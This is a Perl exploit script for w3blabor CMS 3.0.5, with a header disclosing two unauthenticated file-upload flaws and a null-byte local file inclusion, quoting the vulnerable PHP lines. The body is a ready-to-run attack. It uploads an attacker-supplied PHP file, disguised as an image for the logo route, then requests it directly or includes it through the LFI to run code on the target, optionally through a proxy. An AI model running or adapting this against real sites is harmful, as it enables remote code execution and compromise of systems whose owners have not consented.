#!/usr/bin/perl
use LWP::UserAgent;
use HTTP::Request::Common qw(POST);
use Getopt::Long;

#                           \#'#/
#                           (-.-)
#    ------------------oOO---(_)---OOo-----------------
#    |          __             __                     |
#    |    _____/ /_____ ______/ /_  __  ______ ______ |
#    |   / ___/ __/ __ `/ ___/ __ \/ / / / __ `/ ___/ |
#    |  (__  ) /_/ /_/ / /  / /_/ / /_/ / /_/ (__  )  |
#    | /____/\__/\__,_/_/  /_.___/\__,_/\__, /____/   |
#    | Security Research Division      /____/ 2oo8    |
#    --------------------------------------------------
#    |   w3blabor v3.0.5 Arbitrary File Upload & LFI  |
#    --------------------------------------------------
# [!] Discovered.: DNX
# [!] Vendor.....: http://www.w3blaborcms.de
# [!] Detected...: 17.10.2008
# [!] Reported...: 29.11.2008
# [!] Response...: xx.xx.2008
#
# [!] Background.: Sicher! Schnell! Einfach!
#                  Das CMS wurde durch diverse Abfragen und Konfigurationen gegen Hackangriffe
#                  abgesichert. Auch arbeitet es sehr stabil und kommuniziert schnell mit der
#                  angebundenen Datenbank. Die Verwaltung gestaltet sich als besonders einfach im
#                  Gegensatz zu vielen anderen Content Management Systemen - Und genau das macht
#                  es zu etwas Besonderem!
#
# [!] Bug Upload.: in admin/inc/media.inc.php near line 71 (no check on admin privileges)
#
#                  71: if (isset($_GET['action']) && $_GET['action'] == "upload") {
#
#                  80:          $dir = "../../includes/media";
#                  81:          $file = $_FILES['datei']['name'];
#
#                  92:          $file = strtolower($file);
#                  93:
#                  94:          move_uploaded_file($_FILES['datei']['tmp_name'],$dir."/".$file);
#                  95:          @chmod("".$dir.""/"".$file."", 0777);
#
# [!] Bug Upload.: in admin/inc/meinlogo.inc.php near line 45 (no check on admin privileges)
#
#                  45: $neueslogo = $_FILES['neueslogo']['name'];
#                  46: $logopfad = "../../includes/upload/".$settings['page_logo']."";
#                  47:
#                  48: $endung = substr ($_FILES['neueslogo']['name'], -3);
#                  49:
#                  50: if (($endung=="jpg") || ($endung=="peg") || ($endung=="png") || ($endung=="gif") || ($endung=="JPG") || ($endung=="PEG") || ($endung=="PNG") || ($endung=="GIF")) {
#
#                  54: move_uploaded_file($_FILES['neueslogo']['tmp_name'],"../../includes/upload/".$neueslogo);
#
# [!] Bug LFI....: $_GET['modul'] in admin/inc/modul.inc.php near line 47 (requires magic_quotes_gpc = Off)
#
#                  43: $modulfile = "../../includes/module/".$_GET['modul']."/".$_GET['datei'].".inc.php";
#                  44: 
#                  45: if (file_exists($modulfile)) {
#                  46:
#                  47:         include "../../includes/module/".$_GET['modul']."/".$_GET['datei'].".inc.php";
#
# [!] Solution...: no update from vendor till now
#

if(!$ARGV[4])
{
  print "\n                        \\#'#/                    ";
  print "\n                        (-.-)                     ";
  print "\n   ----------------oOO---(_)---OOo----------------";
  print "\n   | w3blabor v3.0.5 Arbitrary File Upload & LFI |";
  print "\n   |                coded by DNX                 |";
  print "\n   -----------------------------------------------";
  print "\n[!] Usage: perl w3blabor.pl [Host] [Path] <Options>";
  print "\n[!] Example: perl w3blabor.pl 127.0.0.1 /w3blabor/ -2 -f s.jpg";
  print "\n[!] Targets:";
  print "\n       -1              Upload over media.inc.php";
  print "\n       -2              Upload over meinlogo.inc.php";
  print "\n[!] Options:";
  print "\n[!]    -f [filename]   Path to local file with php code";
  print "\n       -p [ip:port]    Proxy support";
  print "\n";
  exit;
}

my $host    = $ARGV[0];
my $path    = $ARGV[1];
my $file    = "";
my %options = ();
GetOptions(\%options, "1", "2", "f=s", "p=s");

if($options{"f"})
{
  $file = $options{"f"};
  if(!-e $file)
  {
    print "[!] Failed, local file doesn't exist.\n";
    exit;
  }
}
else
{
  print "[!] Failed, see usage.\n";
  exit;
}

print "[!] Exploiting...\n";

use_bug($host, $path, $file);

print "[!] Exploit done\n";

sub use_bug
{
  my $host = shift;
  my $path = shift;
  my $file = shift;
  
  my $ua       = LWP::UserAgent->new();
  my $url      = "";
  my $url2     = "";
  my $req      = "";
  $file        =~ /.*[\/|\\](.*)/;
  my $filename = $1;
  
  if($options{"p"})
  {
    $ua->proxy('http', "http://".$options{"p"});
  }
  
  if($options{"1"})
  {
    $url = 'http://'.$host.$path.'admin/inc/media.inc.php?action=upload';
    $url2 = 'http://'.$host.$path.'includes/media/'.$filename;
    $req = POST $url, Content_Type => 'form-data', Content => [ datei => [$file], ];
  }
  if($options{"2"})
  {
    if($file =~ m/.*\.jpg|peg|png|gif/i)
    {
      $url = 'http://'.$host.$path.'admin/inc/meinlogo.inc.php?action=upload';
      $url2 = 'http://'.$host.$path.'admin/inc/modul.inc.php?modul=../upload/'.$filename.'%00';
      $req = POST $url, Content_Type => 'form-data', Content => [ neueslogo => [$file], ];
    }
    else
    {
      print "[!] Failed, rename your local file to .jpg\n";
      exit;
    }
  }
  
  $ua->request($req);
  my $res = $ua->get($url2);
  if($res->is_success)
  {
    print "[!] File uploaded\n";
    print "[!] Check your file @ ".$url2."\n";
  }
  else
  {
    print "[!] Failed\n"; 
  }  
}

